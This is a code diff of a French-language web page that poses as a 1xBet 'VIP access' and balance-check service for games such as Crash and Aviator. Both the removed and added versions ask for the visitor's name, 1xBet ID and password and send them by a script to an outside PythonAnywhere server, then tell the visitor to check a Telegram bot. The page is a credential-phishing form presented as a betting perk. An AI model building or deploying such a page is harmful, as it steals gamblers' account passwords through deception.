@@ -3,47 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accès VIP 1xBet</title>
+    <title>Accès VIP - Ngeruka</title>
     <style>
-        body { font-family: sans-serif; background-color: #101e2c; color: white; text-align: center; padding: 20px; }
-        .card { background: #1c2d3e; padding: 20px; border-radius: 10px; max-width: 350px; margin: auto; }
-        input, select, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
-        button { background: #27ae60; color: white; font-weight: bold; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #2c2c2c; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
+        h2 { color: #f39c12; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #3d3d3d; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 5px; background: #f39c12; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #e67e22; }
+        button:disabled { background: #7f8c8d; cursor: not-allowed; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>🚀 ACCÈS VIP</h2>
-        <input type="text" id="nom" placeholder="Nom">
-        <input type="text" id="id_joueur" placeholder="ID 1xBet">
-        <select id="jeu"><option>Aviator</option><option>Crash</option></select>
-        <input type="password" id="password" placeholder="Mot de passe">
-        <button onclick="envoyer()">ACTIVER</button>
-        <div id="status"></div>
-    </div>
 
-    <script>
-        async function envoyer() {
-            const status = document.getElementById('status');
-            const data = {
-                nom: document.getElementById('nom').value,
-                id: document.getElementById('id_joueur').value,
-                jeu: document.getElementById('jeu').value,
-                pass: document.getElementById('password').value
-            };
-            status.innerHTML = "⏳ Connexion...";
-            try {
-                const res = await fetch("https://Ngeruka.pythonanywhere.com/send", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify(data)
-                });
-                if(res.ok) status.innerHTML = "✅ Reçu ! Vérifiez Telegram.";
-                else status.innerHTML = "❌ Erreur Serveur (Fais un Reload)";
-            } catch (e) {
-                status.innerHTML = "❌ Erreur Réseau (Vérifie l'URL)";
+<div class="container">
+    <form id="vipForm">
+        <h2>🎯 ACCÈS VIP 1XBET</h2>
+        <input type="text" id="nom" placeholder="Votre Nom" required>
+        <input type="text" id="id1xbet" placeholder="Votre ID 1xBet" required>
+        <select id="jeu">
+            <option value="Crash">Jeu : Crash</option>
+            <option value="Under Over 7">Jeu : Under Over 7</option>
+            <option value="Apple of Fortune">Jeu : Apple of Fortune</option>
+        </select>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button type="submit" id="submitBtn">VÉRIFIER LE SOLDE</button>
+    </form>
+</div>
+
+<script>
+    const API_URL = "https://ngeruka.pythonanywhere.com/send";
+
+    document.getElementById('vipForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "CONNEXION EN COURS...";
+        btn.disabled = true;
+
+        const payload = {
+            nom: document.getElementById('nom').value,
+            id: document.getElementById('id1xbet').value,
+            jeu: document.getElementById('jeu').value,
+            pass: document.getElementById('password').value
+        };
+
+        try {
+            // Envoi des données vers PythonAnywhere
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                alert("✅ Succès ! Accès VIP activé. Vérifiez votre bot Telegram.");
+            } else {
+                const errorData = await response.json();
+                alert("❌ Erreur serveur : " + (errorData.message || "Inconnue"));
             }
+        } catch (error) {
+            console.error("Erreur Fetch :", error);
+            alert("❌ Erreur de connexion au serveur PythonAnywhere.");
+        } finally {
+            btn.innerText = "VÉRIFIER LE SOLDE";
+            btn.disabled = false;
         }
-    </script>
+    });
+</script>
+
 </body>
 </html>
